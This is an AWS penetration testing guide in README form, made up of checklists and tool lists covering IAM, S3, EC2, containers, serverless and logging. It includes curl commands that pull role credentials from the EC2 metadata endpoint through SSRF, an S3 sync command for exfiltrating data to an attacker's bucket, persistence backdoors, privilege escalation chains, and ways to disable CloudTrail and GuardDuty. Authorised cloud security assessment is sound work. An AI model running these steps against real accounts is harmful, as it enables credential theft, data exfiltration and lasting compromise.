# AWS Penetration Testing Guide

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Status](https://img.shields.io/badge/status-active-success.svg)
![PRs](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)

A practitioner-focused guide for AWS cloud penetration testing and security assessments. Organized by attack surface with checklists, tools, and techniques for each layer.

> **Authorization required.** Always obtain explicit written permission before testing. Review [AWS's penetration testing policy](https://aws.amazon.com/security/penetration-testing/) — some services require prior approval.

---

## Table of Contents

1. [Reconnaissance & Asset Discovery](#1-reconnaissance--asset-discovery)
2. [IAM & Access Control](#2-iam--access-control)
3. [Network & VPC Security](#3-network--vpc-security)
4. [S3 & Storage Security](#4-s3--storage-security)
5. [Compute & EC2](#5-compute--ec2)
6. [Container Security (EKS / ECR)](#6-container-security-eks--ecr)
7. [Serverless (Lambda & API Gateway)](#7-serverless-lambda--api-gateway)
8. [Database Security](#8-database-security)
9. [Identity & Application Security](#9-identity--application-security)
10. [Secrets & Key Management](#10-secrets--key-management)
11. [Logging, Monitoring & Detection](#11-logging-monitoring--detection)
12. [Privilege Escalation Paths](#12-privilege-escalation-paths)
13. [Post-Exploitation & Persistence](#13-post-exploitation--persistence)
14. [Incident Response](#14-incident-response)
15. [Compliance Frameworks](#15-compliance-frameworks)
16. [Tools Reference](#16-tools-reference)

---

## 1. Reconnaissance & Asset Discovery

### External Recon (Unauthenticated)

- [ ] Enumerate DNS records — subdomains pointing to AWS services (S3, CloudFront, Elastic Beanstalk, API GW)
- [ ] Check for subdomain takeovers on unclaimed AWS endpoints (`*.s3.amazonaws.com`, `*.elasticbeanstalk.com`, `*.execute-api.amazonaws.com`)
- [ ] Identify AWS account IDs via public S3 bucket policies, IAM role trust policies, and error messages
- [ ] Enumerate exposed services via Shodan, Censys, FOFA using `org:"Amazon"` + target name
- [ ] Search GitHub, GitLab, and code repos for leaked AWS credentials, account IDs, and region hints ([TruffleHog](https://github.com/trufflesecurity/trufflehog), [Gitleaks](https://github.com/gitleaks/gitleaks))
- [ ] Check CloudTrail logs and public S3 bucket policies for account ID leakage
- [ ] Enumerate S3 bucket names via permutation and certificate transparency logs
- [ ] Identify active regions via `aws ec2 describe-regions` (with creds) or public metadata

### Internal Recon (Post-Credential Acquisition)

- [ ] Enumerate all accessible services — [CloudFox](https://github.com/BishopFox/cloudfox): `cloudfox aws --profile <p> all-checks`
- [ ] Map IAM users, roles, groups, and policies
- [ ] Enumerate all regions for active resources
- [ ] Identify account ID: `aws sts get-caller-identity`
- [ ] List all S3 buckets, EC2 instances, Lambda functions, RDS instances, EKS clusters

### Tools
- [CloudFox](https://github.com/BishopFox/cloudfox) — attack surface enumeration for AWS (and Azure)
- [enumerate-iam](https://github.com/andresriancho/enumerate-iam) — brute-force all API actions available to a credential set
- [aws-recon](https://github.com/darkbitio/aws-recon) — multi-threaded AWS inventory collection
- [Subfinder](https://github.com/projectdiscovery/subfinder) + [httpx](https://github.com/projectdiscovery/httpx) — subdomain enum and fingerprinting
- [cloud_enum](https://github.com/initstring/cloud_enum) — OSINT for AWS/Azure/GCP exposed resources

---

## 2. IAM & Access Control

IAM misconfiguration is the most common root cause of AWS compromise. Treat it as the primary attack surface.

### Checklist

- [ ] Identify overly permissive policies — `*:*` on resources, `*` wildcards on sensitive actions
- [ ] Check for inline policies attached directly to users (harder to audit at scale)
- [ ] Enumerate role trust policies — who can assume what, from where, with what conditions
- [ ] Identify cross-account role abuse — roles assumable from external or unknown accounts
- [ ] Check for `iam:PassRole` granted to principals who can also create Lambda/EC2/ECS resources (PrivEsc vector)
- [ ] Test for `sts:AssumeRole` on roles without `ExternalId` or MFA conditions
- [ ] Identify unused users, roles, and access keys (inactive > 90 days)
- [ ] Check root account — MFA enabled, no active access keys
- [ ] Verify permission boundaries are enforced on delegated admin roles
- [ ] Test Service Control Policies (SCPs) are blocking high-risk actions at the org level
- [ ] Enumerate resource-based policies (S3 bucket policies, Lambda resource policies, KMS key policies) for overly broad grants
- [ ] Check for `iam:CreatePolicyVersion` or `iam:SetDefaultPolicyVersion` privilege escalation paths

### Privilege Escalation Paths (IAM-specific)

Common paths from low-priv to high-priv:
- `iam:CreateAccessKey` on another user → steal their credentials
- `iam:AttachUserPolicy` / `iam:AttachRolePolicy` → attach AdministratorAccess to self
- `iam:CreateLoginProfile` on a user without a password → console access
- `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` → execute as high-priv role
- `iam:PassRole` + `ec2:RunInstances` → launch EC2 with instance profile, retrieve metadata credentials
- `iam:PassRole` + `ecs:RegisterTaskDefinition` + `ecs:RunTask` → same pattern via ECS
- `iam:AddUserToGroup` → add self to admin group
- `iam:CreatePolicyVersion` → update a policy you can edit to add full admin access

### Tools
- [Pacu](https://github.com/RhinoSecurityLabs/pacu) — AWS exploitation framework, includes IAM PrivEsc modules
- [PMapper](https://github.com/nccgroup/PMapper) — graph-based IAM privilege escalation analysis
- [enumerate-iam](https://github.com/andresriancho/enumerate-iam) — enumerate all permitted API actions
- [cloudsplaining](https://github.com/salesforce/cloudsplaining) — IAM policy risk analysis (least-privilege violations)
- [iamlive](https://github.com/iann0036/iamlive) — captures IAM calls made by CLI tools to generate minimal policies
- [aws-iam-authenticator](https://github.com/kubernetes-sigs/aws-iam-authenticator) — test IAM auth for EKS
- [AWS IAM Policy Simulator](https://policysim.aws.amazon.com/) — test policy effects interactively

---

## 3. Network & VPC Security

### Checklist

- [ ] Enumerate security groups for `0.0.0.0/0` inbound rules on sensitive ports (22, 3389, 5432, 3306, 6379, 9200, 27017)
- [ ] Check NACLs for overly permissive rules — NACLs are stateless, misconfigured allow rules are common
- [ ] Review VPC flow logs — are they enabled? Are they being analyzed?
- [ ] Test for EC2 instances with public IPs in non-DMZ subnets
- [ ] Check VPC peering connections — are routes and security groups scoped correctly?
- [ ] Enumerate Transit Gateway attachments and route tables
- [ ] Test AWS WAF rules — bypass techniques (encoding, header manipulation)
- [ ] Check for direct internet gateway routes in private subnets
- [ ] Enumerate Network Load Balancers and ALBs — check security policies, HTTP to HTTPS redirect, header exposure
- [ ] Test Route 53 for zone transfer issues, wildcard records, dangling delegations
- [ ] Check for exposed VPC endpoints — overly permissive endpoint policies

### Tools
- [Nmap](https://github.com/nmap/nmap) — port scanning and service detection
- [Masscan](https://github.com/robertdavidgraham/masscan) — fast port scanning at scale
- [Burp Suite](https://portswigger.net/burp) / [OWASP ZAP](https://www.zaproxy.org/) — WAF bypass testing
- [AWS Inspector](https://aws.amazon.com/inspector/) — network reachability and vulnerability findings
- [ScoutSuite](https://github.com/nccgroup/ScoutSuite) — multi-cloud security auditing including network configs

---

## 4. S3 & Storage Security

### Checklist

- [ ] Enumerate all buckets in the account — `aws s3 ls`
- [ ] Test each bucket for public read/write: `aws s3 ls s3://<bucket>` (unauthenticated)
- [ ] Check bucket ACLs for `AllUsers` or `AuthenticatedUsers` grants
- [ ] Verify Block Public Access settings are enabled at account AND bucket level
- [ ] Check bucket policies for overly broad `Principal: "*"` grants
- [ ] Look for sensitive files: `.env`, `*.pem`, `*.key`, `credentials`, config files, database backups
- [ ] Verify server-side encryption (SSE-S3, SSE-KMS, or DSSE-KMS) is enforced via bucket policy
- [ ] Check versioning — can old versions of sensitive files be retrieved?
- [ ] Test pre-signed URL scope and expiration
- [ ] Enumerate Glacier vaults for archived sensitive data
- [ ] Check EBS snapshots — are any public? (`aws ec2 describe-snapshots --owner-ids self`)
- [ ] Enumerate EFS file systems — access points, mount targets, NFS permissions

### Tools
- [S3Scanner](https://github.com/sa7mon/S3Scanner) — enumerate and test S3 bucket permissions
- [s3-inspector](https://github.com/kromtech/s3-inspector) — checks all buckets for public access
- [Pacu](https://github.com/RhinoSecurityLabs/pacu) — S3 enumeration and exploitation modules
- [trufflehog](https://github.com/trufflesecurity/trufflehog) — scan S3 buckets for secrets in files

---

## 5. Compute & EC2

### Checklist

- [ ] Check EC2 instances for IMDSv1 enabled — IMDSv1 allows SSRF → credential theft without token
  ```bash
  # Check if IMDSv2 is required (should be)
  aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,MetadataOptions.HttpTokens]'
  ```
- [ ] Test SSRF to instance metadata endpoint: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- [ ] Enumerate attached IAM instance profiles — what role does each EC2 have?
- [ ] Check EC2 user data for hardcoded credentials or sensitive configuration
  ```bash
  aws ec2 describe-instance-attribute --instance-id <id> --attribute userData
  ```
- [ ] Enumerate public AMIs — any custom AMIs shared publicly with sensitive data baked in?
- [ ] Check EBS volume encryption status
- [ ] Review EC2 key pairs — unused/orphaned key pairs
- [ ] Test SSH access — key-based only, no password auth, root login disabled
- [ ] Check for public RDP (3389) or SSH (22) exposure
- [ ] Enumerate Auto Scaling Groups and Launch Templates for credential leakage in user data

### IMDSv1 Exploitation via SSRF

If you find SSRF in a web app running on EC2:
```bash
# Get available role names
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get temporary credentials for that role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration
```

### Tools
- [Pacu](https://github.com/RhinoSecurityLabs/pacu) — EC2 enumeration and exploitation
- [CloudFox](https://github.com/BishopFox/cloudfox) — `cloudfox aws instances` for quick inventory
- [Metasploit](https://github.com/rapid7/metasploit-framework) — post-exploitation on compromised EC2

---

## 6. Container Security (EKS / ECR)

### EKS Checklist

- [ ] Enumerate EKS clusters and node groups
- [ ] Check cluster endpoint access — public endpoint enabled? Locked to specific CIDRs?
- [ ] Test IAM-to-Kubernetes RBAC mapping (`aws-auth` ConfigMap or EKS Access Entries)
  - Who can `system:masters`? Are there overly broad bindings?
- [ ] Enumerate service account IAM role associations (IRSA) — what permissions do pods have?
- [ ] Check for privileged pods or pods with `hostPID`, `hostNetwork`, `hostPath` mounts
- [ ] Test for container escape paths — mounted Docker socket, writable `hostPath`
- [ ] Check Kubernetes RBAC — `ClusterRoleBindings` granting `cluster-admin` to broad groups
- [ ] Enumerate secrets in Kubernetes — `kubectl get secrets -A`
- [ ] Test for unauthenticated access to the Kubernetes dashboard
- [ ] Check node IAM role — EC2 node instance profile should have minimal permissions

### ECR Checklist

- [ ] Check for public ECR repositories — `aws ecr-public describe-repositories`
- [ ] Pull container images and scan for secrets baked in layers
- [ ] Check image scanning results — unpatched CVEs in base images?
- [ ] Verify lifecycle policies — are old images cleaned up?

### Tools
- [kube-bench](https://github.com/aquasecurity/kube-bench) — CIS Kubernetes benchmark checks
- [kube-hunter](https://github.com/aquasecurity/kube-hunter) — active Kubernetes pentesting
- [Trivy](https://github.com/aquasecurity/trivy) — container image vulnerability scanning
- [Peirates](https://github.com/inguardians/peirates) — Kubernetes penetration testing tool
- [CDK](https://github.com/cdk-team/CDK) — container escape and lateral movement toolkit
- [rbac-tool](https://github.com/alcideio/rbac-tool) — visualize and audit Kubernetes RBAC

---

## 7. Serverless (Lambda & API Gateway)

### Lambda Checklist

- [ ] Enumerate all Lambda functions: `aws lambda list-functions`
- [ ] Check execution roles — are they over-privileged? (`iam:PassRole` + Lambda is a PrivEsc path)
- [ ] Review environment variables for hardcoded secrets, API keys, database credentials
  ```bash
  aws lambda get-function-configuration --function-name <name> | jq .Environment
  ```
- [ ] Check Lambda layers for supply chain risks — third-party layers with broad account access
- [ ] Test for event injection — can you control event parameters passed to the Lambda?
- [ ] Check resource-based policies — is the Lambda invokable by `Principal: "*"`?
- [ ] Review VPC configuration — Lambda inside VPC may expose internal resources
- [ ] Check timeout and memory settings — resource exhaustion vectors
- [ ] Test for SSRF via Lambda if it fetches external URLs

### API Gateway Checklist

- [ ] Test authentication — API key only (weak), Cognito JWT, IAM authorization
- [ ] Check for missing authorization on specific routes/methods
- [ ] Test for method-level authorization gaps (POST secured, GET not)
- [ ] Test stage variables for injection
- [ ] Check access logs — are they enabled?
- [ ] Enumerate API stages — `dev`/`staging` stages often have weaker controls than `prod`
- [ ] Test for rate limiting bypass — `X-Forwarded-For` header manipulation

### Tools
- [Pacu](https://github.com/RhinoSecurityLabs/pacu) — Lambda and API GW exploitation modules
- [LambdaGuard](https://github.com/Skyscanner/LambdaGuard) — Lambda security auditing
- [Serverless Security](https://github.com/puresec/sas-top-10) — OWASP Serverless Top 10 reference

---

## 8. Database Security

### Checklist

- [ ] Enumerate all RDS instances — `aws rds describe-db-instances`
  - Public accessibility enabled? (`PubliclyAccessible: true`)
  - Encryption at rest enabled?
  - Automated backups and snapshot sharing — are snapshots public?
- [ ] Check RDS security groups — database ports (5432, 3306, 1433, 1521) open to `0.0.0.0/0`?
- [ ] Enumerate DynamoDB tables — check for public access via resource-based policies
- [ ] Check for unencrypted DynamoDB tables
- [ ] Test ElastiCache (Redis/Memcached) — authentication required? Exposed to internet?
- [ ] Enumerate Redshift clusters — public accessibility, encryption, audit logging
- [ ] Check for RDS Proxy configurations — are credentials in Secrets Manager?
- [ ] Test for SQL injection in applications using RDS (sqlmap)
- [ ] Check automated snapshot policies — who can restore? Cross-account restore possible?

### Tools
- [sqlmap](https://github.com/sqlmapproject/sqlmap) — SQL injection testing
- [Pacu](https://github.com/RhinoSecurityLabs/pacu) — RDS snapshot and database enumeration modules
- [S3Scanner](https://github.com/sa7mon/S3Scanner) — check for public RDS/Redshift snapshots

---

## 9. Identity & Application Security

### Cognito

- [ ] Enumerate user pools and identity pools
- [ ] Test for unauthenticated access — identity pools can grant AWS credentials without auth
- [ ] Check for self-registration — can anyone create an account?
- [ ] Test attribute manipulation — can users set custom attributes like `isAdmin`, `role`?
- [ ] Check access token scopes — over-permissive OAuth scopes?
- [ ] Test for JWT flaws in Cognito tokens (alg:none, weak signing)
- [ ] Enumerate app clients — are there clients with no secret (public clients) that shouldn't be?
- [ ] Test MFA policies — is MFA enforced for admin roles?

### Federated Identity & SSO

- [ ] Test SAML assertion manipulation in AWS SSO / IAM Identity Center
- [ ] Check OIDC provider trust — are thumbprints validated?
- [ ] Test for GitHub Actions OIDC abuse — overly broad `sub` claim conditions in role trust policies
- [ ] Enumerate permission sets in IAM Identity Center — who has admin access?

### CloudFront & CDN

- [ ] Test origin access controls — can you bypass CloudFront and hit the S3 origin directly?
- [ ] Check for HTTP to HTTPS redirect enforcement
- [ ] Test cache behavior — can you poison cached responses?
- [ ] Verify custom headers passed to origins are stripped from user input

### Tools
- [Pacu](https://github.com/RhinoSecurityLabs/pacu) — Cognito and identity enumeration modules
- [jwt_tool](https://github.com/ticarpi/jwt_tool) — JWT analysis and attack testing

---

## 10. Secrets & Key Management

### Checklist

- [ ] Enumerate Secrets Manager secrets — `aws secretsmanager list-secrets`
  - Who has `secretsmanager:GetSecretValue`? Is it overly broad?
  - Are secrets rotated automatically?
- [ ] Enumerate Parameter Store values — check `/` prefix for sensitive configs
  - `aws ssm describe-parameters` then retrieve with `get-parameter --with-decryption`
- [ ] Audit KMS key policies — who has `kms:Decrypt` on customer-managed keys?
- [ ] Check for AWS access keys in code repositories, environment variables, EC2 user data, Lambda env vars
- [ ] Verify secrets are not embedded in CloudFormation templates in plaintext
- [ ] Check Systems Manager Session Manager logs — are sessions recorded?

### Tools
- [TruffleHog](https://github.com/trufflesecurity/trufflehog) — scan for secrets in code, S3, and CI/CD pipelines
- [Gitleaks](https://github.com/gitleaks/gitleaks) — detect secrets in git repos
- [git-secrets](https://github.com/awslabs/git-secrets) — prevent committing AWS credentials
- Pacu modules: `aws__enum_secrets_manager`, `aws__enum_ssm`

---

## 11. Logging, Monitoring & Detection

### Checklist

- [ ] Verify CloudTrail is enabled in all regions, including the global services trail
- [ ] Check CloudTrail log file validation — integrity enabled?
- [ ] Verify CloudTrail logs are stored in a separate, hardened S3 bucket (different account preferred)
- [ ] Check S3 access logging on CloudTrail bucket
- [ ] Verify GuardDuty is enabled in all regions — threat detection coverage
- [ ] Check GuardDuty suppression rules — are threat findings being silenced?
- [ ] Review Security Hub findings — aggregated view of all security issues
- [ ] Check AWS Config rules are enabled for key services
- [ ] Verify VPC Flow Logs are enabled for all VPCs
- [ ] Check CloudWatch alarms for key security events (root login, MFA deactivation, security group changes)
- [ ] Verify S3 server access logging is enabled on sensitive buckets
- [ ] Test detection bypass: API calls from unusual regions, user agents, IPs — does GuardDuty alert?

### Detection Gap Checks (Attacker Perspective)

- Can you make API calls from an IP not in the normal baseline without triggering alerts?
- Can you enumerate IAM without triggering `IAMUser/AnomalousBehavior` findings?
- Can CloudTrail be disabled? (`cloudtrail:StopLogging` — should be blocked by SCP)
- Can GuardDuty be disabled? (`guardduty:DeleteDetector` — should be blocked by SCP)

---

## 12. Privilege Escalation Paths

Beyond IAM-specific paths, these cross-service chains are frequently exploitable:

| Starting Permission | Chain | Resulting Access |
|---|---|---|
| `ec2:RunInstances` + `iam:PassRole` | Launch EC2 with admin instance profile | Admin via metadata |
| `lambda:CreateFunction` + `iam:PassRole` + `lambda:InvokeFunction` | Create Lambda with admin role | Admin via function |
| `ecs:RegisterTaskDefinition` + `ecs:RunTask` + `iam:PassRole` | Run ECS task with admin role | Admin via container |
| `glue:CreateJob` + `iam:PassRole` + `glue:StartJobRun` | Create Glue job with admin role | Admin via Glue |
| `cloudformation:CreateStack` + `iam:PassRole` | Deploy CF stack with admin role | Arbitrary AWS actions |
| `datapipeline:CreatePipeline` + `iam:PassRole` | Create pipeline with admin role | Admin via pipeline |
| `sts:AssumeRole` | Assume a more privileged role in the same or different account | Escalated access |
| `secretsmanager:GetSecretValue` | Read DB creds, API keys, etc. | Lateral movement |
| `ssm:StartSession` | SSM session to EC2 → instance profile creds | Lateral movement |

### Tools
- [PMapper](https://github.com/nccgroup/PMapper) — automated graph-based PrivEsc path analysis
- [Pacu](https://github.com/RhinoSecurityLabs/pacu) — `iam__privesc_scan` module
- [cloudfox](https://github.com/BishopFox/cloudfox) — `cloudfox aws permissions` + PrivEsc checks

---

## 13. Post-Exploitation & Persistence

### Checklist

- [ ] Create a backdoor IAM user or access key (document for cleanup — remove after engagement)
- [ ] Add a new key pair to an existing IAM user
- [ ] Create an IAM role assumable from attacker-controlled external account
- [ ] Attach a policy to an existing role silently
- [ ] Plant a Lambda backdoor triggered by CloudWatch Events or S3 uploads
- [ ] Modify an existing EC2 user data to execute payload on reboot
- [ ] Create a shadow admin in an AWS SSO permission set
- [ ] Register a rogue OIDC provider in IAM

### Exfiltration Channels

- S3 sync to attacker-controlled bucket (`aws s3 sync s3://<target> s3://<attacker>`)
- Data extraction via DNS exfil from Lambda/EC2
- SQS/SNS message forwarding
- EC2 AMI creation and public sharing

> Remove **all** persistence mechanisms and cleanup artifacts at engagement end. Document each action in the engagement log.

---

## 14. Incident Response

### Checklist

- [ ] Verify incident response plan exists and is tested
- [ ] Test GuardDuty alerting — does the SOC receive and act on findings?
- [ ] Verify Security Hub is aggregated to a central SIEM
- [ ] Test IAM credential revocation process — how fast can a compromised key be disabled?
- [ ] Verify CloudTrail logs are accessible and queryable (Athena, CloudWatch Log Insights)
- [ ] Test whether CloudTrail `StopLogging` is blocked by SCP
- [ ] Verify EC2 forensic capability — can suspicious instances be snapshotted and isolated quickly?
- [ ] Check if GuardDuty findings trigger automated remediation (Security Hub + EventBridge + Lambda)

### Tools
- [AWS CloudTrail](https://aws.amazon.com/cloudtrail/) — API activity logging
- [AWS GuardDuty](https://aws.amazon.com/guardduty/) — threat detection
- [Amazon Detective](https://aws.amazon.com/detective/) — investigation and root cause analysis
- [ELK Stack](https://www.elastic.co/elastic-stack/) / [OpenSearch](https://opensearch.org/) — log analysis
- [Matano](https://github.com/matanolabs/matano) — open-source security lake on AWS

---

## 15. Compliance Frameworks

| Framework | Scope | Key AWS Controls |
|---|---|---|
| [CIS AWS Foundations Benchmark](https://www.cisecurity.org/benchmark/amazon_web_services) | AWS account hardening | IAM, CloudTrail, S3, VPC |
| [NIST CSF](https://www.nist.gov/cyberframework) | Risk management | Identify, Protect, Detect, Respond, Recover |
| [SOC 2 Type II](https://www.aicpa.org/soc2) | Trust services criteria | Access controls, availability, confidentiality |
| [PCI DSS](https://www.pcisecuritystandards.org/) | Payment card data | Encryption, access control, logging |
| [HIPAA](https://www.hhs.gov/hipaa/) | Healthcare data | PHI encryption, access controls, audit logging |
| [FedRAMP](https://www.fedramp.gov/) | US federal systems | NIST 800-53 controls in AWS |
| [ISO 27001](https://www.iso.org/iso-27001-information-security.html) | ISMS | Risk treatment, access management |

### Automated Compliance Tools
- [Prowler](https://github.com/prowler-cloud/prowler) — AWS/GCP/Azure security checks mapped to CIS, NIST, PCI, HIPAA, SOC2, ISO 27001
- [ScoutSuite](https://github.com/nccgroup/ScoutSuite) — multi-cloud security auditing
- [AWS Security Hub](https://aws.amazon.com/security-hub/) — native aggregation with compliance standards

---

## 16. Tools Reference

| Tool | Category | Description |
|---|---|---|
| [Pacu](https://github.com/RhinoSecurityLabs/pacu) | Exploitation | Modular AWS exploitation framework (Metasploit for AWS) |
| [CloudFox](https://github.com/BishopFox/cloudfox) | Enumeration | Attack surface enumeration — inventory, permissions, secrets, PrivEsc |
| [PMapper](https://github.com/nccgroup/PMapper) | IAM Analysis | Graph-based IAM privilege escalation path analysis |
| [enumerate-iam](https://github.com/andresriancho/enumerate-iam) | IAM Analysis | Brute-force all permitted IAM actions for a credential set |
| [cloudsplaining](https://github.com/salesforce/cloudsplaining) | IAM Analysis | IAM policy least-privilege analysis and risk reporting |
| [iamlive](https://github.com/iann0036/iamlive) | IAM Analysis | Capture actual IAM calls to generate minimal policies |
| [S3Scanner](https://github.com/sa7mon/S3Scanner) | Storage | Open S3 bucket enumeration and permission testing |
| [TruffleHog](https://github.com/trufflesecurity/trufflehog) | Secrets | Scan git repos, S3, CI/CD for exposed secrets |
| [Gitleaks](https://github.com/gitleaks/gitleaks) | Secrets | Detect secrets in git repos and CI pipelines |
| [Prowler](https://github.com/prowler-cloud/prowler) | Compliance | Multi-cloud CIS/NIST/PCI/HIPAA/SOC2 security checks |
| [ScoutSuite](https://github.com/nccgroup/ScoutSuite) | Compliance | Multi-cloud security auditing and reporting |
| [LambdaGuard](https://github.com/Skyscanner/LambdaGuard) | Serverless | Lambda security auditing — roles, env vars, triggers |
| [kube-hunter](https://github.com/aquasecurity/kube-hunter) | Containers | Active Kubernetes cluster penetration testing |
| [kube-bench](https://github.com/aquasecurity/kube-bench) | Containers | CIS Kubernetes benchmark compliance checks |
| [Trivy](https://github.com/aquasecurity/trivy) | Containers | Container image and IaC vulnerability scanning |
| [Peirates](https://github.com/inguardians/peirates) | Containers | Kubernetes penetration testing and privilege escalation |
| [CDK](https://github.com/cdk-team/CDK) | Containers | Container escape and lateral movement |
| [cloud_enum](https://github.com/initstring/cloud_enum) | Recon | OSINT enumeration for AWS/Azure/GCP exposed resources |
| [aws-recon](https://github.com/darkbitio/aws-recon) | Recon | Multi-threaded AWS inventory collection |
| [Amazon Detective](https://aws.amazon.com/detective/) | IR | AWS-native investigation and root cause analysis |
| [Nmap](https://github.com/nmap/nmap) | Network | Port scanning and service detection |
| [sqlmap](https://github.com/sqlmapproject/sqlmap) | Web | SQL injection detection and exploitation |

---

## Contributing

PRs welcome. Useful additions: new attack techniques, updated tool links, coverage of AWS services not yet listed. Keep entries tight with primary sources cited.

---

## License

MIT License. See `LICENSE` for details.
